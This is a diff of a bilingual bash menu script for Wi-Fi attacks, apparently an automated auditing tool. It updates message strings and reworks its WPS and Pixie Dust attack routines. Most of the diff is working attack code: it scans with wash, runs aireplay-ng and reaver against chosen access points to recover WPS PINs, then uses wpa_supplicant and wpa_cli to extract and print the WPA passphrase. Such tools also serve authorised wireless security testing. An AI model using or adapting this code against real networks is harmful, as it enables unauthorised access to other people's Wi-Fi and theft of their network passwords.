@@ -1,5 +1,7 @@
 #!/bin/bash
 
+VERS="20180311" # ♡TH-release
+
 IFACE=""
 REPLY=""
 
@@ -72,7 +74,7 @@ Strings12["English"]="Processing "
 Strings12["Russian"]="Работаем с "
 
 declare -A Strings13
-Strings13["English"]="\033[0;31mPIN is found, trying WAP passphrase. Пин: \e[0m"
+Strings13["English"]="\033[0;31mPIN is found, trying WPA passphrase. PIN: \e[0m"
 Strings13["Russian"]="\033[0;31mПин найден, получаем пароль от Wi-Fi. Пин: \e[0m"
 
 declare -A Strings14
@@ -152,7 +154,7 @@ Strings32["English"]="If you cracked WPS PIN, you are able to obtain WPA passwor
 Strings32["Russian"]="Если вам известен WPS ПИН, то вы можете получить WPA пароль. Для этого необходимо подключиться к целевой ТД. Сейчас будут показаны доступные ТД, выберите желаемую, а затем введите известный ПИН."
 
 declare -A Strings33
-Strings33["English"]="Enter WPS ПИН: "
+Strings33["English"]="Enter WPS PIN: "
 Strings33["Russian"]="Введите WPS ПИН: "
 
 declare -A Strings34
@@ -160,16 +162,28 @@ Strings34["English"]="Wait for 1 minite."
 Strings34["Russian"]="Подождите 1 минуту."
 
 declare -A Strings35
-Strings35["English"]="The password is found: "
-Strings35["Russian"]="Найден пароль: "
+Strings35["English"]="\033[0;32mThe password is found: \e[0m"
+Strings35["Russian"]="\033[0;32mНайден пароль: \e[0m"
 
 declare -A Strings36
 Strings36["English"]="The password is not found. It is worth trying again."
 Strings36["Russian"]="Пароль не найден. Завершение работы. Рекомендуется попробовать ещё несколько раз."
 
 declare -A Strings37
-Strings37["English"]="WPS of this network is disabled or the network is included in Blacklist or in Cracked List. Skipping."
+Strings37["English"]="WPS of this network is locked or the network is included in the Blacklist or in the Cracked List. Skipping."
 Strings37["Russian"]="WPS для этой сети заблокирован, либо она присутствует в списке взломанных или в списке исключений. Пропускаем."
+
+declare -A Strings38
+Strings38["English"]="The first attempt of two attempts"
+Strings38["Russian"]="Попытка 1 из 2."
+
+declare -A Strings39
+Strings39["English"]="The second attempt of two attempts"
+Strings39["Russian"]="Попытка 2 из 2."
+
+declare -A Strings40
+Strings40["English"]="Wait 3 minutes"
+Strings40["Russian"]="Подождите 3 минуты."
 
 
 function selectInterface {
@@ -197,7 +211,7 @@ function selectInterface {
 		echo ${Strings3[$LANGUAGE]}
 		for i in "${DEVS[@]}";
 		do
-			echo "$((COUNTER+1)). ${DEVS[COUNTER]}"
+			echo "$((COUNTER+1)). ${DEVS[COUNTER]}  `sudo airmon-ng | grep ${DEVS[COUNTER]} | awk '{$1=$2=$3=""; print " // " $0}'`"
 			COUNTER=$((COUNTER+1))
 		done
 		read -p "${Strings4[$LANGUAGE]}" INTNUM	
@@ -283,7 +297,8 @@ function showWPSNetworks {
 	if [[ "$IFACE" ]]; then
 
 		sudo xterm -geometry "150x50+50+0" -e "sudo wash -i $IFACE $fcs | tee /tmp/wash.all"
-		echo -e 'Number\tBSSID\t\t   Channel    RSSI  WPS Version  WPS Locked  ESSID'
+#		echo -e 'Number\tBSSID\t\t   Channel    RSSI  WPS Version  WPS Locked  ESSID'
+		echo -e 'Number\tBSSID               Ch  dBm  WPS  Lck  Vendor    ESSID'
 		echo '---------------------------------------------------------------------------------------------------------------'
 		cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | cat -b
 		read -p "${Strings9[$LANGUAGE]}" AIM
@@ -292,7 +307,7 @@ function showWPSNetworks {
 		echo ${Strings11[$LANGUAGE]}
 		sudo iw dev "$IFACE" set channel "$(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | awk 'NR=='"$AIM" | awk '{print $2}')"
 		sudo xterm -geometry "150x50+50+0" -xrm 'XTerm*selectToClipboard: true' -e "sudo aireplay-ng $IFACE -1 120 -a $(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | awk 'NR=='"$AIM" | awk '{print $1}')" &
-		sudo xterm -hold -geometry "150x50+400+0" -xrm 'XTerm*selectToClipboard: true' -e "sudo reaver -i $IFACE -A -b $(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | awk 'NR=='"$AIM" | awk '{print $1}') -v --no-nacks"
+		sudo xterm -hold -geometry "150x50+400+0" -xrm 'XTerm*selectToClipboard: true' -e "echo -e \"\n\" | sudo reaver -i $IFACE -A -b $(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | awk 'NR=='"$AIM" | awk '{print $1}') -v --no-nacks"
 
 	else
 		INF=${Strings5[$LANGUAGE]}
@@ -320,7 +335,7 @@ function PixieDustAattack {
 		FOUNDWPS=$(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | cat -b)
 		if [[ "$FOUNDWPS" ]]; then
 			echo ${Strings14[$LANGUAGE]}
-			echo -e 'Number\tBSSID\t\t   Channel    RSSI  WPS Version  WPS Locked  ESSID'
+			echo -e 'Number\tBSSID               Ch  dBm  WPS  Lck  Vendor    ESSID'
 			echo '---------------------------------------------------------------------------------------------------------------'
 			cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | cat -b
 
@@ -334,49 +349,52 @@ function PixieDustAattack {
 			for i in "${WPSS[@]}"; 
 			do
 				echo ""
-				ESSID=$(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | grep -E "$i" | awk '{print $6}')
-				echo ${Strings12[$LANGUAGE]}"$i ($ESSID)";
-				echo ${Strings11[$LANGUAGE]}
-				isBlocked=$(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | grep -E "$i" | awk '{print $5}')
-				if [[ "$isBlocked" == "Yes" || "`grep $ESSID cracked.txt`" || "`grep $ESSID blacklist.txt`" ]]; then
-					echo -e ${Strings37[$LANGUAGE]}
-				else
-					sudo iw dev "$IFACE" set channel "$(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | grep -E "$i" | awk '{print $2}')"
-		
-					sudo timeout 298 xterm -geometry "150x50+50+0" -xrm 'XTerm*selectToClipboard: true' -e "sudo aireplay-ng $IFACE -1 120 -a $(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | grep -E "$i" | awk '{print $1}')" &
-					sudo timeout 300 xterm -hold -geometry "150x50+400+0" -xrm 'XTerm*selectToClipboard: true' -e "sudo reaver -i $IFACE -A -b $(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | grep -E "$i" | awk '{print $1}') -vv --no-nacks -K 1 | tee /tmp/reaver.pixiedust"
+				ESSID=$(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | grep -E "$i" | awk '{print $7}')
 
-					PIN=$(cat /tmp/reaver.pixiedust | grep -E '\[\+\] WPS pin:' | grep -Eo '[0-9]{8}')
-
-					if [[ "$PIN" ]]; then
-						echo -e ${Strings13[$LANGUAGE]}"$PIN"
-						sudo ip link set "$IFACE" down && sudo iw "$IFACE" set type managed && sudo ip link set "$IFACE" up
-						echo -e "ctrl_interface=/var/run/wpa_supplicant\nctrl_interface_group=0\nupdate_config=1" > /tmp/suppl.conf
-						sudo timeout 60 xterm -hold -geometry "150x50+400+0" -xrm 'XTerm*selectToClipboard: true' -e "sudo wpa_supplicant -i $IFACE -c /tmp/suppl.conf" &
-						sleep 3
-						echo "wps_reg $(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | awk 'NR=='"$i" | awk '{print $1}') $PIN" | sudo wpa_cli
-
-						echo -e ${Strings34[$LANGUAGE]}
-						sleep 60		
-						if [[ "`grep -E 'psk=".*"' /tmp/suppl.conf | sed 's/psk="//' | sed 's/"//'`" ]]; then
-							echo -e ${Strings35[$LANGUAGE]} "`grep -E 'psk=".*"' /tmp/suppl.conf | sed 's/psk="//' | sed 's/"//'`"
-						else 
-							echo -e ${Strings36[$LANGUAGE]}
-						fi
-
-						rm /tmp/suppl.conf
-						sudo ip link set "$IFACE" down && sudo iw "$IFACE" set monitor control && sudo ip link set "$IFACE" up
-
-						#sudo timeout 120 xterm -geometry "150x50+50+0" -xrm 'XTerm*selectToClipboard: true' -e "sudo aireplay-ng $IFACE -1 120 -a $(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | grep -E "$i" | awk '{print $1}') -e \"$(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | grep -E "$i" | awk '{print $6}')\"" &
-						#sudo timeout 120 xterm -hold -geometry "150x50+400+0" -xrm 'XTerm*selectToClipboard: true' -e "sudo reaver -i $IFACE -A -b $(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | grep -E "$i" | awk '{print $1}') -v --no-nacks -p $PIN | tee /tmp/reaver.wpa"
-
-						#cat /tmp/reaver.wpa | grep -E "\[\+\] WPS pin:"
-						#cat /tmp/reaver.wpa | grep -E "WPA"
-						#rm /tmp/reaver.wpa
-
+				if [[ "$ESSID" ]]; then
+					echo ${Strings12[$LANGUAGE]}"$i ($ESSID)";
+					echo ${Strings11[$LANGUAGE]}
+					isBlocked=$(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | grep -E "$i" | awk '{print $5}')
+					if [[ "$isBlocked" == "Yes" || "`grep $ESSID cracked.txt`" || "`grep $ESSID blacklist.txt`" ]]; then
+						echo -e ${Strings37[$LANGUAGE]}
 					else
-						echo ${Strings15[$LANGUAGE]}
-					fi					
+						sudo iw dev "$IFACE" set channel "$(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | grep -E "$i" | awk '{print $2}')"
+		
+						sudo timeout 298 xterm -geometry "150x50+50+0" -xrm 'XTerm*selectToClipboard: true' -e "sudo aireplay-ng $IFACE -1 120 -a $(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | grep -E "$i" | awk '{print $1}')" &
+						sudo timeout 300 xterm -hold -geometry "150x50+400+0" -xrm 'XTerm*selectToClipboard: true' -e "echo -e \"\n\" | sudo reaver -i $IFACE -A -b $(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | grep -E $i | awk '{print $1}') -vv --no-nacks -K 1 | tee /tmp/reaver.pixiedust"
+
+						PIN=$(cat /tmp/reaver.pixiedust | grep -E '\[\+\] WPS pin:' | grep -Eo '[0-9]{8}')
+
+						if [[ "$PIN" ]]; then
+							echo -e ${Strings13[$LANGUAGE]}"$PIN"
+							sudo ip link set "$IFACE" down && sudo iw "$IFACE" set type managed && sudo ip link set "$IFACE" up
+							echo -e "ctrl_interface=/var/run/wpa_supplicant\nctrl_interface_group=0\nupdate_config=1" > /tmp/suppl.conf
+							sudo timeout 60 xterm -hold -geometry "150x50+400+0" -xrm 'XTerm*selectToClipboard: true' -e "sudo wpa_supplicant -i $IFACE -c /tmp/suppl.conf" &
+							sleep 3
+							echo "wps_reg $i $PIN" | sudo wpa_cli
+
+							echo -e ${Strings34[$LANGUAGE]}
+							sleep 60		
+							if [[ "`grep -E 'psk=".*"' /tmp/suppl.conf | sed 's/psk="//' | sed 's/"//'`" ]]; then
+								echo -e ${Strings35[$LANGUAGE]} "`grep -E 'psk=".*"' /tmp/suppl.conf | sed 's/psk="//' | sed 's/"//'`"
+							else 
+								echo -e ${Strings36[$LANGUAGE]}
+							fi
+
+							sudo airmon-ng check kill
+
+							rm /tmp/suppl.conf
+							sudo rm /var/run/wpa_supplicant/$IFACE
+	
+							sudo ip link set "$IFACE" down && sudo iw "$IFACE" set monitor control && sudo ip link set "$IFACE" up
+						else
+							echo ${Strings15[$LANGUAGE]}
+						fi					
+					fi
+				else
+					ESSID=$(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | grep -E "$i" | awk '{print $6}')
+					echo $ESSID
+					echo ''
 				fi
 			done
 		else
@@ -528,16 +546,32 @@ function showWPAPassFromPin {
 		sudo timeout 60 xterm -hold -geometry "150x50+400+0" -xrm 'XTerm*selectToClipboard: true' -e "sudo wpa_supplicant -i $IFACE -c /tmp/suppl.conf" &
 		sleep 3
 		echo "wps_reg $(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | awk 'NR=='"$AIM" | awk '{print $1}') $PIN" | sudo wpa_cli
-
+		echo -e ${Strings38[$LANGUAGE]}
 		echo -e ${Strings34[$LANGUAGE]}
 		sleep 60		
 		if [[ "`grep -E 'psk=".*"' /tmp/suppl.conf | sed 's/psk="//' | sed 's/"//'`" ]]; then
 			echo -e ${Strings35[$LANGUAGE]} "`grep -E 'psk=".*"' /tmp/suppl.conf | sed 's/psk="//' | sed 's/"//'`"
-		else 
+		else
+			sudo airmon-ng check kill
+			sudo rm /var/run/wpa_supplicant/$IFACE
 			echo -e ${Strings36[$LANGUAGE]}
+			sudo timeout 180 xterm -hold -geometry "150x50+400+0" -xrm 'XTerm*selectToClipboard: true' -e "sudo wpa_supplicant -i $IFACE -c /tmp/suppl.conf" &
+			sleep 3
+			echo "wps_reg $(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | awk 'NR=='"$AIM" | awk '{print $1}') $PIN" | sudo wpa_cli	
+			echo -e ${Strings39[$LANGUAGE]}		
+			echo -e ${Strings40[$LANGUAGE]}
+			sleep 180
+
+			if [[ "`grep -E 'psk=".*"' /tmp/suppl.conf | sed 's/psk="//' | sed 's/"//'`" ]]; then
+				echo -e ${Strings35[$LANGUAGE]} "`grep -E 'psk=".*"' /tmp/suppl.conf | sed 's/psk="//' | sed 's/"//'`"
+			else
+				echo -e ${Strings36[$LANGUAGE]}
+			fi
 		fi
 
 		rm /tmp/suppl.conf
+		sudo airmon-ng check kill
+		sudo rm /var/run/wpa_supplicant/$IFACE
 		exit
 		if [ $REPLY -eq 11 ]; then
 			echo "=============================================================="
@@ -587,6 +621,10 @@ cat << _EOF_
 Информация:
 $INF
 
+=======================================================================================
+Официальная страница программы (поддержка и обсуждение): https://hackware.ru/?p=2176
+=======================================================================================
+
 Меню:
 Выберите желаемое действие:
 1. Выбрать беспроводной сетевой интерфейс
@@ -614,11 +652,15 @@ cat << _EOF_
 Information:
 $INF
 
+=======================================================================================
+Script Official Page (support and discussing): https://miloserdov.org/?p=35
+=======================================================================================
+
 Menu:
 Actions:
 1. Select an interface to work with
-2. Put the interface in monitor mode
-3. Put the interface in monitor mode + kill processes hindering it + kill NetworkManager
+2. Set the interface in monitor mode
+3. Set the interface in monitor mode + kill processes hindering it + kill NetworkManager
 4. Show Open Wi-Fi networks
 5. WEP Attack
 6. WPS Attack
